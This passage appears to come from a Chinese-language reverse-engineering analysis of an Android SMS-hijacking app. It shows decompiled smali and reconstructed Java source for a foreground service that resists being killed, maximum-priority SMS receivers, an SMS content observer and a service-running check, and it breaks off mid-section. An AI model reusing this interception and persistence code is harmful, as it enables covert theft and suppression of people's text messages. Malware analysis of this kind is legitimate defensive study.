
``` 
    new-instance v0, Landroid/app/Notification; //创建通知栏

    const v1, 0x7f020001

    const-string v2, ""

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v3

    invoke-direct {v0, v1, v2, v3, v4}, Landroid/app/Notification;-><init>(ILjava/lang/CharSequence;J)V

    new-instance v1, Landroid/content/Intent;

    invoke-direct {v1}, Landroid/content/Intent;-><init>()V

    new-instance v2, Landroid/widget/RemoteViews;

    invoke-virtual {p0}, Lcn/android/emial/SmSserver;->getPackageName()Ljava/lang/String;

    move-result-object v3

    const/high16 v4, 0x7f03

    invoke-direct {v2, v3, v4}, Landroid/widget/RemoteViews;-><init>(Ljava/lang/String;I)V

    iput-object v2, v0, Landroid/app/Notification;->contentView:Landroid/widget/RemoteViews;

    invoke-static {p0, v5, v1, v5}, Landroid/app/PendingIntent;->getActivity(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v1

    iput-object v1, v0, Landroid/app/Notification;->contentIntent:Landroid/app/PendingIntent;

    const/16 v1, 0x64
    //将服务至于前台 使之不被结束
    invoke-virtual {p0, v1, v0}, Lcn/android/emial/SmSserver;->startForeground(ILandroid/app/Notification;)V

    new-instance v0, Landroid/content/IntentFilter;

    invoke-direct {v0}, Landroid/content/IntentFilter;-><init>()V

    const-string v1, "android.provider.Telephony.SMS_RECEIVED"

    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    const-string v1, "android.provider.Telephony.SMS_RECEIVED_2"

    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    const-string v1, "android.provider.Telephony.GSM_SMS_RECEIVED"

    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    const/16 v1, 0x3e8

    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->setPriority(I)V

    new-instance v1, Lcn/android/emial/SmSReceiver;

    invoke-direct {v1}, Lcn/android/emial/SmSReceiver;-><init>()V

    iput-object v1, p0, Lcn/android/emial/SmSserver;->b:Lcn/android/emial/SmSReceiver;

    iget-object v1, p0, Lcn/android/emial/SmSserver;->b:Lcn/android/emial/SmSReceiver;

    const-string v2, "android.permission.BROADCAST_SMS"
    //  动态注册监听广播  使之优先级更高确保监听
    invoke-virtual {p0, v1, v0, v2, v6}, Lcn/android/emial/SmSserver;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;Ljava/lang/String;Landroid/os/Handler;)Landroid/content/Intent;

    new-instance v0, Lcn/android/emial/SmSReceiver;

    invoke-direct {v0}, Lcn/android/emial/SmSReceiver;-><init>()V

    iput-object v0, p0, Lcn/android/emial/SmSserver;->c:Lcn/android/emial/SmSReceiver;

    iget-object v0, p0, Lcn/android/emial/SmSserver;->c:Lcn/android/emial/SmSReceiver;

    new-instance v1, Landroid/content/IntentFilter;

    const-string v2, "com.yfm.send"

    invoke-direct {v1, v2}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0, v0, v1}, Lcn/android/emial/SmSserver;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    new-instance v0, Lcn/android/emial/a;

    invoke-direct {v0, p0, v6}, Lcn/android/emial/a;-><init>(Landroid/content/Context;Landroid/os/Handler;)V

    iput-object v0, p0, Lcn/android/emial/SmSserver;->d:Lcn/android/emial/a;

    invoke-virtual {p0}, Lcn/android/emial/SmSserver;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    sget-object v1, Lcn/android/emial/SmSserver;->a:Landroid/net/Uri;

    const/4 v2, 0x1

    iget-object v3, p0, Lcn/android/emial/SmSserver;->d:Lcn/android/emial/a;

    invoke-virtual {v0, v1, v2, v3}, Landroid/content/ContentResolver;->registerContentObserver(Landroid/net/Uri;ZLandroid/database/ContentObserver;)V

    new-instance v0, Lcn/android/emial/c;

    invoke-direct {v0, p0}, Lcn/android/emial/c;-><init>(Lcn/android/emial/SmSserver;)V

    invoke-virtual {v0}, Lcn/android/emial/c;->start()V
```

其源码为：

```
  Notification notification=new Notification(R.drawable.ic_launcher,"",System.currentTimeMillis());//v0
      Intent intent=new Intent();//v1
      //RemoteViews在类的自定义通知的时候可以用到，用来设置自定义通知的布局资源
      RemoteViews contentView=new RemoteViews(getPackageName(), R.layout.activity_main);
      //检索一个PendingIntent，将启动一个新的activity，注意该activity将在一个存在的activity的上下文之外启动
      PendingIntent contentIntent =PendingIntent.getActivity(this,0,intent,0);
      //通过startForeground让服务前台运行，以免长时间不用而被kill
      //如果不加setLatestEventInfo函数 将导致奔溃，但原来的代码中却没有
      notification.setLatestEventInfo(this,"点击查看","点击查看详细内容",contentIntent);
      startForeground(100,notification);

      IntentFilter intentFilter=new IntentFilter(); //v0
      intentFilter.addAction("android.provider.Telephony.SMS_RECEIVED");
      intentFilter.addAction("android.provider.Telephony.SMS_RECEIVED_2");
      intentFilter.addAction("android.provider.Telephony.GSM_SMS_RECEIVED");
      intentFilter.setPriority(0x3e8);

      b=new SmSReceiver();
      c=new SmSReceiver();
      IntentFilter intentFilter2=new IntentFilter("com.yfm.send");
      //动态注册监听广播
      this.registerReceiver(b,intentFilter,"android.permission.BROADCAST_SMS",null);
      this.registerReceiver(c, intentFilter2);

      d=new FilterSMS(this, null);
      ContentResolver contentResolver=getContentResolver();
      //为指定的Uri注册一个ContentObserver派生类实例，当给定的Uri发生改变时，回调该实例对象去处理。
      contentResolver.registerContentObserver(uri, true, d);
      //创建sendhandlerMessage类，启动其线程
      new sendhandlerMessage().start();
```

### 行为（4）代码：静态注册监听广播，过滤短信

首先是在`xml`中申明该监听器：

```
<receiver android:name="SmSReceiver">
        <intent-filter android:priority="2147483647">
            <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
            <action android:name="android.provider.Telephony.SMS_RECEIVED_2"/>
            <action android:name="android.provider.Telephony.GSM_SMS_RECEIVED"/>
            <category android:name="android.intent.category.DEFAULT"/>
        </intent-filter>
    </receiver>
```

`SmSReceiver`类会在拦截短信进行一些判断 如时间是否在`2013-10-20 00:00:0`之后 然后调用

`a(Landroid/os/Bundle;Landroid/content/Context;Lcn/android/emial/SmSReceiver;)V`方法

也就是`SMShijacking`方法 进一步判断是否终止广播

这段涉及到几个类 为了不使文章过于长 就不列出源码了 具体看工程文件把

### 行为（5）代码：类`BootReceiver` 检查服务是否正在运行

该类调用`.method public static a(Landroid/content/Context;Ljava/lang/String;)Z`方法也就是源码中的`GetService`来遍历当前服务 看该apk服务是否运行

//GetService如下

```
.method public static a(Landroid/content/Context;Ljava/lang/String;)Z
    .locals 5

    const/4 v1, 0x0

    const-string v0, "activity"

    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/ActivityManager;

    const/16 v2, 0x28

    invoke-virtual {v0, v2}, Landroid/app/ActivityManager;->getRunningServices(I)Ljava/util/List;

    move-result-object v3

    invoke-interface {v3}, Ljava/util/List;->size()I

    move-result v4

    move v2, v1

    :goto_0
    if-lt v2, v4, :cond_0

    move v0, v1

    :goto_1
    return v0

    :cond_0
    invoke-interface {v3, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/ActivityManager$RunningServiceInfo;

    iget-object v0, v0, Landroid/app/ActivityManager$RunningServiceInfo;->service:Landroid/content/ComponentName;

    invoke-virtual {v0}, Landroid/content/ComponentName;->getClassName()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1

    const/4 v0, 0x1

    goto :goto_1

    :cond_1
    add-int/lit8 v0, v2, 0x1

    move v2, v0

    goto :goto_0
.end method
```

源码为：
